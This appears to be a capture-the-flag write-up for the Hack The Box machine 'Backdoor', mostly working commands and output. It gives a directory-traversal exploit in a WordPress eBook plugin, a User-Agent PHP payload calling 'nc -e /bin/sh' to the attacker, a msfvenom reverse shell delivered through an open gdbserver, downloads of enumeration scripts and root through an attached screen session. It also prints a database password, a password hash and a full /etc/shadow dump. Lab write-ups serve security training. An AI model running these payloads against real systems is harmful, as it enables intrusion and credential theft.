**Front Page**
![[front-web-page.png]]

**Login Page**

```bash
http://10.10.11.125/wp-login.php
```

![[wp-login-init.png]]

**Found username**

```bash
wpscan --url backdoor.HTB-boxes -f cli-no-color -o enum/web/wpscan_host.md  --enumerate u,m,vp,vt,tt,cb,dbe
```

![[found admin user.png]]

**Uploads Directory**

```bash
http://10.10.11.125/wp-content/uploads/
```

![[uploads dir.png]]


### Ebook Plugin


wpscan output:
```bash
[+] ebook-download
 | Location: http://10.10.11.125/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
```

urls to visit:
```bash
http://10.10.11.125/wp-content/plugins/
http://10.10.11.125/wp-content/plugins/ebook-download/
```

![[ebook plugin dir.png]]

Exploit From ExploitDB: https://www.exploit-db.com/exploits/39575
EDB-ID: 39575

```bash
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7
 
[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================
 
[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

Modified Exploit Code:

```bash
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd
```

Recieve a download:
![[download etc-passwd.png]]

See users on box:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```


```bash
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/self/environ
```

Send to Burp Repeater:
![[repeater1.png]]

Payload Reference: https://a3h1nt.medium.com/from-local-file-inclusion-to-reverse-shell-774fe61b7e1e

Original payload:
```
<? passthru(“nc -e /bin/sh 172.16.177.175 69”); ?>
```

Modified payload:
```
<? passthru(“nc -e /bin/sh 10.10.14.4 4321”); ?>
```

Modify user agent with reverse shell payload:
```bash
GET /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/self/environ HTTP/1.1
Host: 10.10.11.125
User-Agent: <? passthru(“nc -e /bin/sh 10.10.14.4 4321”); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wordpress_test_cookie=WP%20Cookie%20check; comment_author_4545923ecb2bebeede89fc49569c46f6=dev; comment_author_email_4545923ecb2bebeede89fc49569c46f6=dev%40gmail.com; comment_author_url_4545923ecb2bebeede89fc49569c46f6=http%3A%2F%2Fdev.com
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

### Exploiting GDB Server

start multi handler listener
```
nc -lvnp 4321
```

Exploitation Reference: https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver

Steps to Follow:

```bash

1) msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4321 PrependFork=true -f elf -o binary.elf

2) chmod +x binary.elf

3) gdb binary.elf

4) target extended-remote 10.10.11.125:1337

5) remote put binary.elf binary.elf

6) set remote exec-file /home/user/binary.elf

7) run

```

**Ouptut from process**
```bash
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from binary.elf...
(No debugging symbols found in binary.elf)
(gdb) target extended-remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
(gdb) remote put binary.elf binary.elf
Successfully sent file "binary.elf".
(gdb) set remote exec-file /home/user/binary.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /home/user/binary.elf from remote target...
Reading /home/user/binary.elf from remote target...
Reading symbols from target:/home/user/binary.elf...
(No debugging symbols found in target:/home/user/binary.elf)
[Detaching after fork from child process 25790]
[Inferior 1 (process 25773) exited normally]
(gdb)
```

![[gdb exploitation.png]]

we are able to get a very primative reverse shell, but a shell nonetheless.
![[pop shell.png]]
![[pop shell handler.png]]

local.txt (user)
![[local.txt (user).png]]

```bash
6b703f8f851ed42c0e37aafdadba7854
```

**Upgrade shell to a tty**
Reference: https://0xffsec.com/handbook/shells/full-tty/

```bash
SHELL=/bin/bash script -q /dev/null
```

![[upgrade shell.png]]

### Machine Enumeration

On attacker machine:

```bash
python3 -m http.server 8000
```

On target:

```bash
wget http://10.10.14.4:8000/linpeas.sh
wget http://10.10.14.4:8000/linenum.sh
```

![[downloading privesc tools.png]]

Running enumeration tools:

```bash
bash linenum.sh | tee linenum.log && bash linpeas.sh | tee linpeas.log
```

Interesting output:

```bash

[-] SUID files:
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 474280 Feb 23  2021 /usr/bin/screen  
-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec

...



╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux 3.0a


/tmp/tmux-1000

...


[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

...


╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 www-data www-data 3769 Nov  8 17:01 /var/www/html/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
define( 'DB_HOST', 'localhost' );
$currenthost = "http://".$_SERVER['HTTP_HOST'];
$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));


```

We can see that there are multiple unique services running as the root user.

```bash

root         885  0.0  0.0   2608  1800 ?        Ss   07:02   0:00  |   _ /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
root       25643  0.0  0.1   8404  3868 ?        S    08:00   0:00  |       _ su user -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
user       25646  0.0  0.1   6892  3312 ?        Ss   08:00   0:00  |           _ bash -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
user       25657  0.0  0.1  11844  3944 ?        S    08:00   0:00  |               _ gdbserver --once 0.0.0.0:1337 /bin/true
root         832  0.0  0.1   8352  3400 ?        S    07:02   0:00  _ /usr/sbin/CRON -f
root         853  0.0  0.0   2608  1760 ?        Ss   07:02   0:02      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done

...

```

**Mysql Credentials from **

```txt
username: wordpressuser
password: MQYBJSaD#DxG6qbm
```

Mysql Enumeration Commands:

```txt
mysql -u wordpressuser -pMQYBJSaD#DxG6qbm
use wordpress;
select * from wp_users;
exit
```

Found mysql admin user hash:

```txt
admin::$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5
```

### Privilege Escalation

```bash
SHELL=/bin/bash script -q /dev/null
export TERM=xterm
screen -x root/root
```

![[get root.png]]

root.txt

```
2630fe7ba50e8adf06523504a7686134
```

### Cleanup

```bash
rm -rf /home/user/binary.elf
rm -rf /dev/shm/tmp/
rm -rf /root/.ssh/sshpriv /root/.ssh/sshpriv.pub
```

/etc/passswd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

/etc/shadow

```
root:$6$Ge7j2m6HBATUjQ8p$nNMtfyfrLzjPvVl9Txt58qcx1Lm9jpd23z7a5qOLBuzbiUfuh4NrQtUBDHE8v6n3q17tfZJ6.f3nvgfEZS5qB/:19064:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18826:0:99999:7:::
sshd:*:18826:0:99999:7:::
systemd-coredump:!!:18826::::::
user:$6$HW/ZyGUqJGqPwnDH$97Bjh8unoViZeVDy2xDn4aq8O55Vevz4qEgFHwAisonfTrzac1oUoRSEyr7SRVRdiQp32eh98EBo4cbN8PVfJ.:18832:0:99999:7:::
lxd:!:18826::::::
mysql:!:18832:0:99999:7:::
```